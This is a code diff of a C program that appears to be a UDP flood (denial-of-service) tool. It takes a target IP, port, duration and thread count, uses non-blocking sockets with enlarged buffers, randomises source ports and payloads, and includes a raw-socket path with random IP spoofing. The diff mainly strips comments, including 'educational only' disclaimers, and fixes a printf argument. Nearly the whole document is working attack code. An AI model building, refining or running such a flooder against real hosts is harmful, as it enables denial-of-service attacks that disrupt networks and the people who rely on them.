@@ -35,13 +35,11 @@ typedef struct {
     unsigned long errors;
 } thread_data;
 
-// Random IP generator for spoofing (educational only)
 void generate_random_ip(char *buffer) {
     snprintf(buffer, 16, "%d.%d.%d.%d", 
         rand() % 256, rand() % 256, rand() % 256, rand() % 256);
 }
 
-// Create raw socket for advanced packet crafting
 int create_raw_socket() {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock == -1) {
@@ -59,7 +57,6 @@ int create_raw_socket() {
     return sock;
 }
 
-// Create optimized UDP socket
 int create_udp_socket() {
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock == -1) {
@@ -67,35 +64,28 @@ int create_udp_socket() {
         return -1;
     }
     
-    // Enable socket reuse and other optimizations
     int reuse = 1;
     if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
         perror("setsockopt(SO_REUSEADDR) failed");
     }
     
-    // Set non-blocking for higher throughput
     int flags = fcntl(sock, F_GETFL, 0);
     fcntl(sock, F_SETFL, flags | O_NONBLOCK);
     
-    // Increase socket buffer sizes
-    int buf_size = 1024 * 1024; // 1MB buffer
+    int buf_size = 1024 * 1024;
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
     setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
     
     return sock;
 }
 
-// Generate random payload with patterns for analysis
 void generate_payload(char *payload, int size) {
-    // Start with a pattern for identification
     memcpy(payload, "UDPSTRESS", 9);
     
-    // Add random data
     for (int i = 9; i < size; i++) {
         payload[i] = (char)(rand() % 256);
     }
     
-    // Add some identifiable patterns at fixed intervals
     for (int i = 0; i < size; i += 64) {
         if (i + 4 < size) {
             payload[i] = 'P';
@@ -112,15 +102,13 @@ void *udp_flood(void *arg) {
     char payload[MAX_PACKET_SIZE];
     struct timeval start_time, current_time;
     int sock = -1;
-    int use_raw = 0; // Change to 1 to test raw sockets (needs root)
+    int use_raw = 0;
     
-    // Initialize destination address
     memset(&dest_addr, 0, sizeof(dest_addr));
     dest_addr.sin_family = AF_INET;
     dest_addr.sin_port = htons(data->target_port);
     dest_addr.sin_addr.s_addr = inet_addr(data->target_ip);
     
-    // Create socket based on mode
     if (use_raw) {
         sock = create_raw_socket();
     } else {
@@ -136,7 +124,6 @@ void *udp_flood(void *arg) {
     
     gettimeofday(&start_time, NULL);
     
-    // Pre-generate spoofed IPs (educational only)
     char spoofed_ips[SPOOFED_IP_COUNT][16];
     if (use_raw) {
         for (int i = 0; i < SPOOFED_IP_COUNT; i++) {
@@ -150,11 +137,9 @@ void *udp_flood(void *arg) {
             break;
         }
         
-        // Generate random payload
         int pkt_size = DEFAULT_PACKET_SIZE + (rand() % (MAX_PACKET_SIZE - DEFAULT_PACKET_SIZE));
         generate_payload(payload, pkt_size);
         
-        // Randomize source port for each packet
         if (!use_raw) {
             struct sockaddr_in src_addr;
             memset(&src_addr, 0, sizeof(src_addr));
@@ -168,11 +153,8 @@ void *udp_flood(void *arg) {
             }
         }
         
-        // Send packet
         int bytes_sent;
         if (use_raw) {
-            // Advanced: Craft full IP/UDP packet with spoofed source (needs root)
-            // This is just a placeholder - actual implementation would need full packet crafting
             bytes_sent = sendto(sock, payload, pkt_size, 0, 
                               (struct sockaddr *)&dest_addr, sizeof(dest_addr));
         } else {
@@ -187,8 +169,7 @@ void *udp_flood(void *arg) {
             data->errors++;
         }
         
-        // Micro-optimization: Small delay to prevent complete socket buffer saturation
-        usleep(10); // 10 microseconds
+        usleep(10);
     }
     
     close(sock);
@@ -231,7 +212,7 @@ void handle_signal(int sig) {
 int main(int argc, char *argv[]) {
     if (argc != 5) {
         printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
-        printf("Example: %s 192.168.1.1 80 60 4\n");
+        printf("Example: %s 192.168.1.1 80 60 4\n", argv[0]);
         return 1;
     }
     
@@ -245,27 +226,22 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    // Verify target IP
     struct sockaddr_in sa;
     if (inet_pton(AF_INET, target_ip, &(sa.sin_addr)) != 1) {
         printf("Invalid IP address\n");
         return 1;
     }
     
-    // Initialize random seed
     srand(time(NULL) ^ getpid());
     
-    // Set up signal handler
     signal(SIGINT, handle_signal);
     signal(SIGTERM, handle_signal);
     
-    // Initialize mutex
     if (pthread_mutex_init(&lock, NULL) != 0) {
         printf("Mutex init failed\n");
         return 1;
     }
     
-    // Create threads
     pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
     thread_data *thread_data_arr = malloc(thread_count * sizeof(thread_data));
     
@@ -292,7 +268,6 @@ int main(int argc, char *argv[]) {
         }
     }
     
-    // Monitor progress
     struct timeval start_time, current_time;
     gettimeofday(&start_time, NULL);
     
@@ -304,7 +279,6 @@ int main(int argc, char *argv[]) {
             break;
         }
         
-        // Print progress every second
         if (elapsed > 0 && (current_time.tv_sec % 1 == 0)) {
             unsigned long total_packets = 0;
             for (int i = 0; i < thread_count; i++) {
@@ -316,18 +290,15 @@ int main(int argc, char *argv[]) {
             fflush(stdout);
         }
         
-        usleep(100000); // 100ms
+        usleep(100000);
     }
     
-    // Wait for all threads to finish
     for (int i = 0; i < thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
     
-    // Print final statistics
     print_stats(thread_data_arr, thread_count);
     
-    // Cleanup
     pthread_mutex_destroy(&lock);
     free(threads);
     free(thread_data_arr);
